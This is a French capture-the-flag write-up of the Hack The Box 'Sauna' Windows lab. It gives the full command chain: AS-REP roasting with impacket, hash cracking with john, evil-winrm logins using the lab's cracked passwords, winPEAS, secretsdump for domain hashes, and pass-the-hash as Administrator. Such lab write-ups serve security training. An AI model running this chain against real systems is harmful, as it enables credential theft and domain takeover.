![Pic1](../img/sauna1.PNG?raw=true) </br>

# Introduction

Sauna est une box Windows qui a pour adresse IP 10.10.10.175.</br>

Compétences mises en oeuvre :
* Enumération des ports et services d'une machine distante.
* Obtenir un ticket kerberos d'un utilisateur pour avoir son hash via impacket.
* Obtenir des hash d'utilisateurs via impacket.
* Utilisation de evil-winrm pour se connecter à distance.
</br>

# Enumération initiale

Nous commençons par l'énumération des ports et services de la box avec nmap :
```bash
$ nmap -T4 -A 10.10.10.175
```
![Pic2](../img/sauna2.PNG?raw=true) </br>

Plusieurs ports d'ouvert, nous allons faire une énumération des fichiers/dossiers du site web avec dirsearch :
```bash
$ dirsearch -w wordlist -e "php,txt" -f -t 100 -x 400,500,404,501 -u http://10.10.10.175/
```
![Pic3](../img/sauna3.PNG?raw=true) </br>
Rien de spécial dans cette énumération... Les autres ports donneront de meilleurs résultats.

# Obtenir un accès utilisateur

Le port 88 est ouvert, nous pouvons donc tenter d'obtenir des tickets kerberos d'utilisateur avec le script de impacket : GetNPUsers.py.</br>
Le fichier user;txt en paramètre est la liste des utilisateurs vu sur le site web (au format 1ère lettre du prénom + nom).</br>
```bash
$ python3 GetNPUsers.py egotistical-bank.local/ -no-pass -usersfile user.txt
```
![Pic4](../img/sauna4.PNG?raw=true) </br>
Nous avons juste l'utilisateur fsmith qui est accepté et dont nous avons maintenant un ticket kerberos avec le hash de son mot de passe. Nous utilisons alors john pour cracker le mot de passe :
```bash
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![Pic5](../img/sauna5.PNG?raw=true) </br>
Avec un indice, j'ai refait un scan de port avec nmap car des ports hauts sont également ouverts :
```bash
$ nmap -T4 -p1-65535 10.10.10.175
```
Effectivement, le port 5985 nous intérèsse particulièrement car c'est le port par défaut. nous pouvons alors nous connecter en utilisant evil-winrm :
```bash
evil-winrm -i 10.10.10.175 --user fsmith --password Thestrokes23
```
![Pic6](../img/sauna6.PNG?raw=true) </br>
Nous avons alors le user.txt.

# Obtenir un accès administrateur
En énumérant avec winPEAS, nous obtenons un identifiant/mot de passe :
```bash
evil-winrm > upload /home/parrot/winPEASx64.exe
evil-winrm > ./winPEASx64.exe all
```
![Pic7](../img/sauna7.PNG?raw=true) </br>
Nous pouvons alors nous connecter avec ce compte et refaire une énumération avec winPEAS :
```bash
evil-winrm -i 10.10.10.175 --user svc_loanmgr --password Moneymakestheworldgoround!
evil-winrm > upload /home/parrot/winPEASx64.exe
evil-winrm > ./winPEASx64.exe all
```
Comme svc_loanmgr est un utilisateur du domaine, nous pouvons essayer de dumper des mots de passes du domaine avec un script de impacket :
```bash
$ secretsdump.py 'EGOTISTICAL/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
```
![Pic8](../img/sauna8.PNG?raw=true) </br>
Plusieurs hash, mais le premier est le plus intéréssant : celui de l'Administrator, il faut savoir que evil-winrm nous permet de nous connecter avec le hash au lieu du mot de passe :
```bash
$ evil-winrm -i 10.10.10.175 -u administrator -H hash
```
![Pic9](../img/sauna9.PNG?raw=true) </br>
